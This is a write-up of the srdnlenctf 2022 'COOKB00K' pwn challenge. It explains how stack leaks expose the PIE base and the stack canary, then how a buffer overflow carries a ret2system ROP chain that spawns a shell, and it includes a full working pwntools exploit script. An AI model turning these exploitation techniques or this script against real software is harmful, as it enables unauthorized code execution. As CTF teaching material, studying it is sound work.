# srdnlenctf 2022

## COOKB00K (X solves)

I coded this program to keep in order my delicious recipes.
During development, I was having fun with function pointers when I started seeing some weird artifacts appearing on my screen!
Can you please check if there is any security issue in my software?

This binary is a recipe manager for top notch chiefs only.
It is provided with 6 unique operations available to the end-user:

- 1. View recipes list
- 2. Add recipe
- 3. Remove recipe
- 4. Edit recipe
- 5. View recipe
- 6. Quit

The binary is compiled for 64-bit machines with the following security enhancements enabled: Full RELRO, No Execute, Canary and PIE.

The main (intended) issues of this program are described with comments alongside the vulnerable functions and elements inside the [code.c](/pwn_cookb00k/src/code.c) file.

### Solution

The exploitation starts from leaking the PIE generated base address.
It is possible to leak an internal program function pointer of the 6 end-user operations (&view_recipes) by using the vulnerability described at line 104 of [code.c](/pwn_cookb00k/src/code.c#L104): by not having the NULL string terminator on the local char[8] variable it is possible to read data (input will be considered as invalid index value and printed) from the stack ([main function](/pwn_cookb00k/src/code.c#L381) stack frame, storing a pointer next to the buffer).
Once retrieved the view_recipes address, we can subtract its offset in the binary to it and get the PIE base address of this execution for later use (calculate other functions and plt addresses we'll need later).

We then leak the canary by using the same vulnerability, but this time, from one of the end-user operations: [view_recipe](/pwn_cookb00k/src/code.c#L231).
In this case we will be overwriting the last byte of the canary (which is always 0x00). By doing so, it is possible to read the whole canary and other data next to it. We then restore the original last 0x00 byte of the canary to avoid stack smashing detection.

The last step of the exploitation is about taking the control of the execution flow and getting a reverse shell. We'll get it with the vulnerability explained at line 27 of [code.c](/pwn_cookb00k/src/code.c#L27).
The vulnerable function is used in the [load_ingredients function](/pwn_cookb00k/src/code.c#L160), which is called by two of the end-user operations: [add_recipe](/pwn_cookb00k/src/code.c#L245) & [edit_recipe](/pwn_cookb00k/src/code.c#L302).
We basically can overflow the load_ingredients' stackframe and reach the return address with some padding.
We start the actual ROP payload with a "ret;" gadget to allign the stack pointer, we then append a "pop rdi; ret;" gadget which can be found in the executable and load a pointer to a "/bin/sh\x00" string into RDI (first parameter of a call in amd64 linux calling convention); after this we just need to call the system function (used in the executable) which can be found in the PLT. By chaining and sending this payload a shell will pop on our screen. The flag will be located at ./flag.txt.

### Exploit

```python
#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF('./cookb00k')

host = args.HOST or 'cookb00k.challs.srdnlen.it'
port = int(args.PORT or 10350)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *main
b *load_ingredients
b *load_ingredients+480
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()


def bof(payload):
    io.sendline(b'2')               # add recipe
    io.sendline(b'just a name')     # name
    io.sendline(b'1')               # difficulty
    io.sendline(b'1')               # rating
    io.sendline(b'1')               # cooking time
    io.sendline(b'1')               # salt amount
    # fill the linked list and overflow the local buffer
    io.sendline(b'a'*511)           # ingredient #1 (padding)
    io.sendline(b'a'*511)           # ingredient #2 (padding)
    io.sendline(b'a'*7)             # ingredient #3 (padding)
    io.sendline(canary + payload)   # ingredient #4 [buffer overflowing starts here]
    io.sendline(b'')                # stop adding ingredients


def leak_canary():
    global canary

    io.sendline(b'5')                 # view recipe
    io.sendline(b'a'*8)               # padding to overflow the canary 0x00 byte and not get NULL terminated on print
    io.recvuntil(b'You provided an invalid index value:\n0'+b'a'*8)
    leak = io.recvline()
    leak = bytes([0]) + leak          # add the NULL terminating 0x00 to the canary we have previously overwritten
    canary = bytes(leak[:8])          # take canary only
    print('leaked canary:', hex(int.from_bytes(canary, 'little')))
    io.sendline(b'a'*7+b'\x00')       # put the NULL terminating 0x00 of the canary back to its place to avoid stack smashing detection
    io.sendline(b'1')                 # recipe #1 and keep going
    io.recvrepeat(timeout=.5)         # clean receive buffer


def leak_pie():
    io.sendline(b'a'*7)               # only 7 padding bytes needed
    io.recvuntil(b'You provided an invalid index value:\n0'+b'a'*7)
    leak = io.recvline()
    func_addr = int.from_bytes(leak[:6], 'little')
    print('leaked view_recipes function address:', hex(func_addr))
    pie = func_addr - 0x1BCF          # subtract offset of function we got the pointer to (view_recipes) to get module base address
    print('pie base address:', hex(pie))
    exe.address = pie
    io.recvrepeat(timeout=.5)         # clean receive buffer


leak_pie()
leak_canary()

rop = ROP(exe)

bin_sh = next(exe.search(b'/bin/sh\0'))
system_func = exe.symbols['plt.system']

rop.raw(b'a'*24)                    # padding
rop.raw(p64(rop.ret.address))       # ret; gadget
rop.raw(p64(rop.rdi.address))       # pop rdi; ret; gadget
rop.raw(p64(bin_sh))                # put ptr to "/bin/sh\0" string on the stack
rop.raw(p64(system_func))           # call system() with "/bin/sh\0" as parameter to get shell

bof(rop.chain())

io.sendline(b'ls')
io.sendline(b'cat flag.txt')


io.interactive()

```
